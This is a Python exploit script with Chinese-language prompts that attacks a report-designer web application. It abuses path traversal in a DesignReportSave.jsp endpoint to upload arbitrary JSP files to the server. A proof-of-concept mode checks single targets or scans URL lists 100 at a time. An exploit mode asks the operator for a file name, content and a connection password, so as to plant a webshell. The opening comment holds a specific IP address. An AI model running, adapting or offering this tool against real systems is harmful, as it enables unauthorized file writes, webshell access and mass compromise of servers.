#http://139.196.192.42:8085
import argparse
import re
import requests
import sys
import time
import os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def poc(target):
    url = target + "/report/DesignReportSave.jsp?report=../testqq9.jsp"
    url1 = target + "/testqq9.jsp"
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101 Firefox / 120.0",
        "Accept - Encoding": "gzip, deflate",
        "Accept": "text / html, application / xhtml + xml, application / xml; q = 0.9, image / avif, image / webp, * / *;q = 0.8",
        "Connection": "close",
        "Accept - Language": "zh - CN, zh; q = 0.8, zh - TW; q = 0.7, zh - HK; q = 0.5, en - US; q = 0.3, en; q = 0.2",
        "Upgrade - Insecure - Requests": "1",
        "Content - Type": "application / octet - stream",
        "Content - Length": "25"
    }
    data = '< % out.print("TESTQIQI"); % >'

    proxies = {
        "http":"http://127.0.0.1:8088",
        "https":"http://127.0.0.1:8088"
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        res1 = requests.get(url=url1,verify=False)
        if res.status_code == 200:
            if res1.status_code == 200:
                if "TESTQIQI" in res1.text:
                    print("文件上传成功，文件访问成功！！！！！！！"+target)
                    return True
                else:
                    print("文件上传成功，但上传内容没有显示"+target)
                    return False
            else:
                print("文件上传成功，访问文件失败"+target)
                return False
        else:
            print("文件上传失败，不存在文件上传漏洞"+target)
            return False
    except Exception as e:
        print(e)


def exp(target):
    print("~~~~~~~~~~拿shell中~~~~~~~~~~~~~")
    time.sleep(2)
    os.system("cls")
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101 Firefox / 120.0",
        "Accept - Encoding": "gzip, deflate",
        "Accept": "text / html, application / xhtml + xml, application / xml; q = 0.9, image / avif, image / webp, * / *;q = 0.8",
        "Connection": "close",
        "Accept - Language": "zh - CN, zh; q = 0.8, zh - TW; q = 0.7, zh - HK; q = 0.5, en - US; q = 0.3, en; q = 0.2",
        "Upgrade - Insecure - Requests": "1",
        "Content - Type": "application / octet - stream",
        "Content - Length": "25"
    }
    while True:
        E = input("输入q为退出，任意输入继续")
        w = input("请输入你要上传的文件")
        n = input("请输入你要上传的内容")
        passwd = input("你的连接密码")
        url = target + "/report/DesignReportSave.jsp?report=../" + w
        url1 = target + "/" +w
        data = f'< % out.print("{n}"); % >'
        if E == "q":
            exit()
            return True
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        res1 = requests.get(url=url1,verify=False,timeout=5)
        if res.status_code == 200:
            if res1.status_code == 200:
                if n in res1.text:
                    print("文件上传成功，文件访问成功！！！！！！！"+target)
                    print("连接网址为"+target+"/"+w)
                    print("连接密码为"+passwd)
                    return True
                else:
                    pass
            else:
                pass
        else:
            break




def banana():
    banana = """

     ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
 ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
      ░                                                                                       


    """
    print(banana)


def main():
    banana()


    parser = argparse.ArgumentParser(description="远程命令执行漏洞")
    parser.add_argument("-u", "--url", help="输入你的URL")
    parser.add_argument("-f", "--file", help="please input your usernamefile")

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n"," "))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()